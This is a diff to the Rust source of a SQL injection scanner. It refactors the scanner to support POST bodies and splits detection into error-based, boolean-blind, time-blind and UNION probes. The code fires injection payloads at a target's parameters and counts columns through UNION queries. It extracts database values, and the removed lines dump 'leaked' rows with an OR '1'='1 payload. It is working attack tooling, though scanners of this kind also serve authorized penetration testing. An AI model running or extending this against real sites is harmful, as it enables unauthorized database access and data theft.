@@ -1,125 +1,103 @@
+
+use url::Url;
 use crate::http;
 use crate::payloads;
-//use anyhow::Ok;
 use colored::Colorize;
-use url::Url;
 
 
+#[derive(Clone)]
+enum Method {
+    Get,
+    Post,
+}
 
+#[derive()]
+struct RequestConfig{
+    url: String, 
+    method: Method,
+    body: Option<String>,
+    cookie: Option<String>,
+}
 
-pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::Result<()>{
+impl RequestConfig {
+    fn send(&self, param: &str, payload: &str) -> anyhow::Result<http::HttpResponse>{
+        match self.method {
+            Method::Get => {
+                let url = replace_param(&self.url, param, payload)?;
+                http::get(&url, self.cookie.clone())
+            }
+            Method::Post => {
+                let body = self.body.as_deref().unwrap_or("");
+                let injected = inject_post_param(body, param, payload);
+                http::post(&self.url, &injected, self.cookie.clone())
+            }
+        }
+    }
+    fn send_raw(&self) -> anyhow::Result<http::HttpResponse>{
+        match self.method {
+           Method::Get => http::get(&self.url, self.cookie.clone()),
+           Method::Post => http::post(&self.url, self.body.as_deref().unwrap_or(""), self.cookie.clone())
+        }
+
+    }
+}
+pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str, method: &str, post_data: Option<&str>) -> anyhow::Result<()>{
     crate::disclaimer::print_warning();
-    let parsed = Url::parse(target_url)?;
-    let  params: Vec<(String, String)> = parsed
-        .query_pairs()
-        .map(|(k, v)| (k.to_string(), v.to_string()))
-        .collect();
+    let is_post = method.to_uppercase() == "POST";
+
+    if is_post && post_data.is_none() {
+        println!("{}", "POST method requires --data".yellow().bold());
+        return Ok(());
+    }
+    
+    let config = RequestConfig{
+        url:target_url.to_string(),
+        method: if is_post{
+            Method::Post
+        }else{
+            Method::Get
+        },
+        body: post_data.map(String::from),
+        cookie: cookie.map(String::from),
+    };
+
+    let params: Vec<(String, String)> = if is_post {
+        parse_body_params(post_data.unwrap_or(""))
+    }else {
+        Url::parse(target_url)?
+            .query_pairs()
+            .map(|(k, v)| (k.into(), v.into()))
+            .collect()
+    };
+
     if params.is_empty(){
-        println!("No query  parameters found. Nothing to inject.");
+        println!("{}", "No parameters found.".yellow().bold());
         return Ok(());
     }
 
-    println!("Found {} Injectable parameters", params.len());
+    println!("Found {} injectable parameter(s)", params.len());
+    println!("Scan type: {} | method: {}", scan_type, method);
 
+    let baseline = config.send_raw()?;
+    println!("Baseline: status= {}, body_len={}, time= {}ms", 
+        baseline.status, baseline.body.len(), baseline.response_time_ms);
 
-    let baseline = http::get(target_url, cookie)?;
-    println!("Baseline: status= {}, body_len={}, time={}ms", baseline.status, baseline.body.len(), baseline.response_time_ms);
-    
-    let run_error = scan_type == "error" || scan_type == "all";
-    let run_boolean = scan_type == "boolean" || scan_type == "all";
-    let run_time = scan_type == "time" || scan_type == "all";
-    let run_union = scan_type == "union" || scan_type == "all";
-    
-    for (param_name, _original_value) in &params {
-        println!("\n--- Testing Param: {} ---", param_name);
-        if run_error {
-                let mut error_found = false;
-                for payload in payloads::error_based()  {
-                let injected_url = replace_param(target_url, param_name, payload)?;
-                let res = http::get(&injected_url, cookie)?;
-         
-                if let Some(db) = super::detector::detect_error_based(&res.body) {
+    let types = match scan_type {
+        "all" => vec!["error", "boolean", "time", "union"],
+        _ => vec![scan_type],
+    };
 
-                    let finding = super::detector::Finding{
-                        sqli_type: "Error-based".to_string(),
-                        param: param_name.clone(),
-                        db_type: Some(db),
-                        payload: payload.to_string(),
-                        evidence: format!("SQL error in response body")
-                    };
-                    
-                    println!("{}", finding);
+    for (param_name, _) in &params  {
+        println!("\n --- Testing Param: {} ---", param_name);
 
-                    let extract_url = replace_param(target_url, param_name, "1' OR '1'='1")?;
-                    let extract_res = http::get(&extract_url, cookie)?;
-                    let data = super::detector::extract_data(&extract_res.body);
-                    if !data.is_empty() {
-                        println!("\n Leaked data: {} rows:", data.len());
-                        for row in &data  {
-                            println!("      {}", row);
-                        }
-                    }
-                    error_found = true;
-                    break;
-                }
-            }
-            if !error_found {
-                println!("  Error-based: not detected");
-            }
-        }
-        if run_boolean {
-            let mut bool_found = false;
-            for (true_payload, false_payload) in payloads::boolean_blind()  {
-                let true_url = replace_param(target_url, param_name, true_payload)?;
-                let false_url = replace_param(target_url, param_name, false_payload)?;
-                let true_res = http::get(&true_url, cookie)?;
-                let false_res = http::get(&false_url, cookie)?;
-        
-                if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {
-
-                    let finding = super::detector::Finding{
-                        sqli_type: "Boolean-Blind".to_string(),
-                        param: param_name.clone(),
-                        db_type: None,
-                        payload: true_payload.to_string(),
-                        evidence: format!("TRUE: {} | False: {} | Diff: {}", true_res.body.len(),false_res.body.len(),(true_res.body.len() as isize - false_res.body.len() as isize).abs())
-                    };
-                    println!("{}", finding);
-                    bool_found = true;
-                    break;
-                }
-            }
-            if !bool_found {
-                let msg = "  Boolean-Blind: not detected".dimmed();
-                println!("{}", msg);
-            }
-        }
-        if run_time {
-            let mut time_found = false;
-            for (payload, db_type) in payloads::time_blind()  {
-                let injected_url = replace_param(target_url, param_name, payload)?;
-                let res = http::get(&injected_url, cookie)?;
-            
-                if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
-                    
-                    let finding = super::detector::Finding{
-                        sqli_type: "Time-Blind".to_string(),
-                        param: param_name.clone(),
-                        db_type: Some(db_type.to_string()),
-                        payload: payload.to_string(),
-                        evidence: format!("Baseline: {}ms | Injected: {}ms | Delta: {}ms", baseline.response_time_ms, res.response_time_ms, res.response_time_ms - baseline.response_time_ms),
-                    };
-                    println!("{}", finding);
-                    time_found = true;
-                    break;
-                }
-            }
-            if !time_found {
-                println!("  Time-Blind: not detected");
-            }
-        }
-        if run_union {
-            probe_union(target_url, param_name, cookie)?;
+        if types.contains(&"error") {
+            probe_error(&config, param_name, &baseline)?;
+        }if types.contains(&"boolean") {
+            probe_boolean(&config, param_name, &baseline)?;
+        }if types.contains(&"time") {
+            probe_time(&config, param_name, &baseline)?;
+        }if types.contains(&"union") {
+            probe_union(&config, param_name, &baseline)?;
         }
     }
     let msg_finish = "\n============= Scan Complete =============".blue().bold();
@@ -127,16 +105,135 @@ pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::
     Ok(())
 }
 
+fn parse_body_params(body: &str) -> Vec<(String, String)> {
+    body.split('&')
+        .filter_map(|pair|{
+            let mut parts = pair.splitn(2, '=');
+            match (parts.next(), parts.next()){
+                (Some(k), Some(v)) => Some((k.into(), v.into())), _ => None,
+            }
+        })
+        .collect()
+}
 
-fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyhow::Result<()> {
+fn inject_post_param(body: &str, param: &str, payload: &str) -> String{
+    body.split('&')
+        .map(|pair|{
+            let mut parts = pair.splitn(2, '=');
+            match (parts.next(), parts.next()) {
+                (Some(k), _) if k == param => format!("{}={}", k, payload), _=> pair.to_string(),
+            }
+        })
+        .collect::<Vec<_>>()
+        .join("&")
+}
+
+fn replace_param(url_str: &str, param: &str, payload: &str) -> anyhow::Result<String>{
+    let mut parsed = Url::parse(url_str)?;
+    let new_query: Vec<(String, String)> = parsed.query_pairs() 
+    .map(|(k, v)| {
+        if k == param {
+            (k.to_string(), payload.to_string())
+        }else {
+            (k.to_string(), v.to_string())
+        }
+    })
+    .collect();
+
+    parsed.query_pairs_mut().clear();
+    for (k, v) in &new_query {
+        parsed.query_pairs_mut().append_pair(k, v);
+    }
+
+    Ok(parsed.to_string())
+}
+
+fn probe_error(config: &RequestConfig, param: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
+    for payload in payloads::error_based() {
+        let res = config.send(param, payload)?;
+        if let Some(db) = super::detector::detect_error_based(&res.body){
+            println!("{}", super::detector::Finding{
+                sqli_type: "Error-Based".to_string(),
+                param: param.to_string(),
+                db_type: Some(db),
+                payload: payload.to_string(),
+                evidence: "SQL error in response body".to_string(),
+            });
+            return Ok(());
+        }
+    }
+    if detect_error_fallback(baseline, config, param){
+        return Ok(());
+    }
+    println!("{}", "Error-Based: Not detected".dimmed());
+    Ok(())
+}
+
+fn detect_error_fallback(baseline: &http::HttpResponse, config: &RequestConfig, param: &str) -> bool{
+    for payload in payloads::error_based() {
+        if let Ok(res) = config.send(param, payload) {
+            let orig = baseline.body.len();
+            let fuzz = res.body.len();
+            if fuzz > orig + 200 && fuzz > 500 {
+                println!("[Suspicious] Large response delta (+{}bytes)", fuzz < orig);
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn probe_boolean(config: &RequestConfig, param: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
+    for (true_payload, false_payload) in payloads::boolean_blind() {
+        let true_res = config.send(param, true_payload)?;
+        let false_res = config.send(param, false_payload)?;
+
+        if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {
+            let diff = (true_res.body.len() as isize - false_res.body.len() as isize).abs();
+            println!("{}", super::detector::Finding{
+                sqli_type: "Boolean-Blind".to_string(),
+                param: param.to_string(),
+                db_type: None, 
+                payload: true_payload.to_string(),
+                evidence: format!("TRUE: {} | FALSE: {} | Diff: {}",
+                    true_res.body.len(), false_res.body.len(), diff),
+            });
+            return Ok(());
+        }
+    }
+    println!("{}", "    Boolean-Blind: not detected".dimmed());
+    Ok(())
+}
+
+fn probe_time(config: &RequestConfig, param: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
+    for (payload, db_type) in payloads::time_blind()  {
+        let res = config.send(param, payload)?;
+        if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
+            println!("{}", super::detector::Finding{
+                sqli_type: "Time-Blind".to_string(),
+                param: param.to_string(),
+                db_type: Some(db_type.to_string()),
+                payload: payload.to_string(),
+                evidence: format!(
+                    "Baseline: {}ms | Injected: {}ms | Delta: {}",
+                    baseline.response_time_ms, res.response_time_ms, res.response_time_ms - baseline.response_time_ms
+                ),
+            });
+            return Ok(());
+        }
+    }
+    println!("{}", "    Time-Blind: not detected".dimmed());
+    Ok(())
+}
+
+fn probe_union(config: &RequestConfig, param_name: &str, baseline: &http::HttpResponse) -> anyhow::Result<()> {
     let msg_step1 = "  [UNION] step 1: Finding column count...".cyan().dimmed();
     println!("{}", msg_step1);
 
     let mut col_count: u32 = 0;
     for n in 1..=20  {
         let payload = payloads::union_order_by(n);
-        let url = replace_param(target_url, param_name, &payload)?;
-        let res = http::get(&url, cookie)?;
+        let res = config.send(param_name, &payload)?;
 
         if super::detector::detect_error_based(&res.body).is_some() 
             || res.body.len() < 100
@@ -158,8 +255,8 @@ fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyh
     let mut reflection_col: Option<u32> = None;
     for pos in 0..col_count  {
         let payload = payloads::union_find_reflection(col_count, pos);
-        let url = replace_param(target_url, param_name, &payload)?;
-        let res = http::get(&url, cookie)?;
+        let res = config.send(param_name, &payload)?;
+
 
         if res.body.contains("sqli_test") {
             reflection_col = Some(pos);
@@ -189,13 +286,10 @@ fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyh
 
     for (expr, label) in extractions  {
         let payload = payloads::union_extract(col_count, reflect_pos, expr);
-        let url = replace_param(target_url, param_name, &payload)?;
-        let res = http::get(&url, cookie)?;
-
+        let res = config.send(param_name, &payload)?;
         if let Some(value) = super::detector::extract_value(&res.body) {
-            println!("  {}: {}", label.yellow().bold(), value.green());
+            println!("{}: {}", label,value);
         }
-
     }
 
     println!();
@@ -212,24 +306,4 @@ fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyh
 
 }
 
-fn replace_param(url_str: &str, param: &str, payload: &str) -> anyhow::Result<String>{
-    let mut parsed = Url::parse(url_str)?;
-    let new_query: Vec<(String, String)> = parsed
-    .query_pairs() 
-    .map(|(k, v)| {
-        if k == param {
-            (k.to_string(), payload.to_string())
-        }else {
-            (k.to_string(), v.to_string())
-        }
-    })
-    .collect();
-
-    parsed.query_pairs_mut().clear();
-    for (k, v) in &new_query {
-        parsed.query_pairs_mut().append_pair(k, v);
-    }
-
-    Ok(parsed.to_string())
-}
 
